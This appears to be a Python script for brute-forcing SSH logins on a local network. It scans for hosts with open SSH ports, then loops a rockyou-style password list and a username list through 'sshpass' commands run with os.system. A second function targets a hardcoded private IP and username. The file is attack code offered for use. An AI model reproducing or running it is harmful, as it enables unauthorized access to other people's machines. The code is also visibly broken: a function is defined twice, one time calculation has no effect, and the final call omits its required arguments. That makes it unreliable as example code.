import os
import time
import datetime

'''
-------------------------------------------------------MYIMPORTS-------------------------------------------------------
'''

import SSHScanNetwork
import SSHFiles

'''
-------------------------------------------------------TIMING-------------------------------------------------------
'''

days = 0
hours = 0
minutes = 0
runtimeSeconds = time.process_time()

'''
-------------------------------------------------------MODE-------------------------------------------------------
'''

mode2 = "ssh"
mode = "sshpass -p"
toAttack = "potet"
server = "192.168.1.131"

'''
-------------------------------------------------------FILES TO READ-------------------------------------------------------
'''

passwordFile = "rockyou2.txt"
usernameFile = "usernames.txt"

#Reading passwords
fileName = os.path.join(SSHFiles.getPathToCurrentDir() + passwordFile)
pws = open(fileName)
passwords = pws.readlines()

#Reading usernames
fileName = os.path.join(SSHFiles.getPathToCurrentDir() + usernameFile)
usr = open(fileName)
usernames = usr.readlines()

ipAddresses = SSHScanNetwork.getListWithIpsOfOpenSSHPorts()
print(ipAddresses)


#        output = os.popen(command).read()
#        print(output)
#        sudo apt install sshpass
#        if "Welcome to" in output:
            #Successfully breached
            #break

'''
-------------------------------------------------------TIME-------------------------------------------------------
'''

def formatTime(runtimeSeconds, minutes, hours, days):
    runtimeSeconds = time.process_time_ns() / 100000000
    if runtimeSeconds >= 60:
        runtimeSeconds = runtimeSeconds - 60
        minutes = minutes + 1
    if  minutes >= 60:
        minutes = minutes - 60
        hours = hours + 1
    if hours >= 24:
        hours = hours - 24
        days + days + 1
    return "D: " + str(days) + "H: " + str(hours) + "M: " + str(minutes) + "S: " + str(runtimeSeconds)

'''
-------------------------------------------------------PROGRAMS-------------------------------------------------------
'''

def attackAllOnScannedNetworkBySequenceImproved():
    counter = 0
    isError = False
    for ip in ipAddresses:
        if isError:
            break
        for user in usernames:
            if isError:
                break
            removingBreakline = user.split("\n")
            user = removingBreakline[0]
            for pw in passwords:
                try:
                    if isError:
                        break
                    counter += 1
                    pw = pw[:-1]
                    password = str(pw)
                    print("Attacking: " + ip + " with user: " + str(user) + " Trying: with password: " + password + " Attempt: " + str(counter))  
                    commandLiteral = mode + " " + password + " " + mode2 + " " + str(user) + "@" + ip
                    print(commandLiteral)
                    command = mode + " " + password + " " + mode2 + " " + str(user) + "@" + ip
                    os.system(command)
                except KeyboardInterrupt:
                    print("etasd")
                    isError = True
                    break

def attackAllOnScannedNetworkBySequenceImproved():
    counter = 0
    isError = False
    for ip in ipAddresses:
        if isError:
            break


def targetAttack(ipAddress, usernameOrpassword, howManyInstances):
    # EG VAR HER SIST
    #ipAddress, usernameOrpassword, howManyInstances
    #Used when you have additional information about target

    #username = -u 'username'
    #password = -p 'password'

    print("")

    nilsIP = "192.168.1.111"
    counter = 0
    isError = False
    for pw in passwords:
        try:
            if isError:
                break
            counter += 1
            pw = pw[:-1]
            password = str(pw)
            command = mode + " " + password + " " + mode2 + " potet" + "@" + nilsIP
            os.system(command)
        except KeyboardInterrupt:
            print("etasd")
            isError = True
            break

#def readPreviouslyAttacked(listWithIPs):

'''
-------------------------------------------------------MAIN-------------------------------------------------------
'''

targetAttack()